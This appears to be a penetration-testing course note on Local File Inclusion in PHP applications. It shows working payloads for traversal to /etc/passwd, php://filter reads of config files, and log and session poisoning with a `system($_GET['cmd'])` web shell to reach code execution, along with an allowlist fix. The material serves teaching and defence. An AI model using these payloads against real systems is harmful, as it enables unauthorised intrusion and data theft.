---
tags: [vapt, lfi, rce, intermediate]
difficulty: intermediate
module: "23 - Path Traversal and LFI/RFI"
topic: "23.05 Local File Inclusion (LFI)"
---

# 23.05 — Local File Inclusion (LFI)

## What is it?
Local File Inclusion (LFI) is a vulnerability similar to Path Traversal, but with a massive, critical difference: **Execution**. 

While Path Traversal only allows an attacker to *read* a file (e.g., viewing the text of `/etc/passwd`), LFI occurs when an application takes user input and passes it to a function that **includes and executes** the file as code (such as PHP's `include()`, `require()`, or NodeJS's `require()`).

If an attacker uses LFI to include `/etc/passwd`, the server will read the file and output it to the screen (because it doesn't contain PHP tags, it defaults to plain text). However, if the attacker can somehow place malicious code into a file anywhere on the server (like an access log, a session file, or an image upload) and then use LFI to *include* that file, the server will execute the malicious code. **LFI almost always leads to Remote Code Execution (RCE).**

Think of Path Traversal as tricking a guard into letting you *read* a top-secret document. Think of LFI as tricking the guard into reading the document *out loud over the intercom*. If you wrote a hypnotic spell on that document beforehand, the guard will broadcast it to the whole building.

## ASCII Diagram
```text
[Attacker]
   │
   │ 1. Injects PHP code into the Web Server's Access Log via User-Agent:
   │    User-Agent: <?php system('whoami'); ?>
   ▼
[Web Server Access Log: /var/log/apache2/access.log]
   │
[Attacker]
   │ 
   │ 2. Triggers LFI: GET /index.php?page=../../../../var/log/apache2/access.log
   ▼
[Vulnerable PHP App]
   │
   │ 3. Executes: include("../../../../var/log/apache2/access.log");
   │ 4. Parses the entire log file looking for <?php ... ?> tags.
   │ 5. Finds the attacker's User-Agent string.
   ▼
[PHP Interpreter] ─── 6. Executes system('whoami') -> RCE Achieved!
```

## How to Find It
- **Manual steps:**
  1. Look for parameters used to dynamically load content, templates, or languages (e.g., `?page=about`, `?lang=en`, `?module=home`).
  2. Test with a standard path traversal payload: `?page=../../../../../../etc/passwd`.
  3. If you see the contents of `/etc/passwd` rendered within the HTML of the page, you have an LFI.
  4. Note the context: Did it just read the file, or did it try to parse it? If it throws PHP errors when you point it at binary files, it is an LFI (execution context) rather than a simple File Read.

- **Tool commands with flags explained:**
  You can use `ffuf` to discover LFI just as you would Path Traversal:
  ```bash
  ffuf -u "https://target.com/index.php?page=FUZZ" \
       -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt \
       -mc 200 -mr "root:x:0:0:"
  ```

## How to Exploit It
- **Step-by-step walkthrough (Escalating LFI to RCE):**
  1. Confirm the LFI vulnerability by reading `/etc/passwd`.
  2. To achieve RCE, you must find a way to place your malicious PHP code (e.g., `<?php system($_GET['cmd']); ?>`) into a file on the server. This is called "Log Poisoning" or "File Upload chaining."
  3. Example (Log Poisoning): Send a request to the server with the PHP payload in the `User-Agent` header. The web server writes this to `/var/log/apache2/access.log`.
  4. Use the LFI vulnerability to include the log file: `?page=../../../../../../var/log/apache2/access.log&cmd=id`.
  5. The PHP `include()` function parses the log, finds your PHP tags, and executes the `id` command.

- **Actual payloads:**
  **Basic LFI Confirmation:**
  ```text
  ?page=../../../../../../../../etc/passwd
  ```
  **LFI via PHP Wrappers (If reading files normally fails):**
  ```text
  ?page=php://filter/convert.base64-encode/resource=config.php
  ```
  *(See Note 23.06 for deep dive on PHP Wrappers)*

- **Real HTTP request/response examples:**
  **LFI Triggering Poisoned Log:**
  ```http
  GET /index.php?page=../../../../../var/log/apache2/access.log&cmd=whoami HTTP/1.1
  Host: target.com
  ```
  **Response:**
  ```http
  HTTP/1.1 200 OK
  
  127.0.0.1 - - [10/Oct/2023:13:55:36] "GET / HTTP/1.1" 200 - "www-data" Mozilla/5.0
  ```
  *(Notice "www-data" is the output of the executed `whoami` command embedded inside the log file text!)*

## Real-World Example
A Bug Bounty hunter found a parameter `?view=dashboard` on a target application. By changing it to `?view=../../../../../../etc/passwd`, they confirmed an LFI. To escalate to RCE, they needed to place a payload on the server. They noticed the application used PHP Sessions. They logged into the application and changed their "Username" profile field to `<?php system('id'); ?>`. PHP saves session variables to disk in `/var/lib/php/sessions/sess_<session_id>`. The hunter then triggered the LFI: `?view=../../../../../../var/lib/php/sessions/sess_12345`. The server included the session file, evaluated the username as PHP code, and executed the `id` command.

## How to Fix It
- **Developer remediation:**
  Do not dynamically include files based on user input. If you must load dynamic modules or pages, map the user input strictly to an allowlist or a database ID. Never pass user input directly into `include()`, `require()`, `include_once()`, or `require_once()`.

- **Code snippet:**
  **PHP (Strict Allowlist for Inclusion):**
  ```php
  $page = $_GET['page'];
  
  // Hardcoded allowlist of valid pages
  $allowed_pages = [
      'home' => 'modules/home.php',
      'about' => 'modules/about.php',
      'contact' => 'modules/contact.php'
  ];
  
  // Only include the file if it explicitly exists in the allowlist
  if (array_key_exists($page, $allowed_pages)) {
      include($allowed_pages[$page]);
  } else {
      // Default fallback
      include('modules/home.php');
  }
  ```

## Chaining Opportunities
- This vuln + [[07 - LFI to RCE via Log Poisoning]] → The most common path from LFI to RCE. Poison the Apache/Nginx access or error logs with PHP code, then include the log file.
- This vuln + [[02 - Unrestricted File Upload — Webshell Upload]] → If the site allows you to upload an image but strictly verifies it is a `.jpg`, upload a valid `.jpg` that has PHP code hidden in the EXIF metadata. Then use LFI to `include('uploads/image.jpg')`. The `include()` function doesn't care about extensions; it will execute the PHP code hidden inside the JPEG!

## Related Notes
- [[01 - What is Path Traversal?]]
- [[06 - LFI via PHP Wrappers (php:__filter, php:__input, data:__)]]
- [[07 - LFI to RCE via Log Poisoning]]
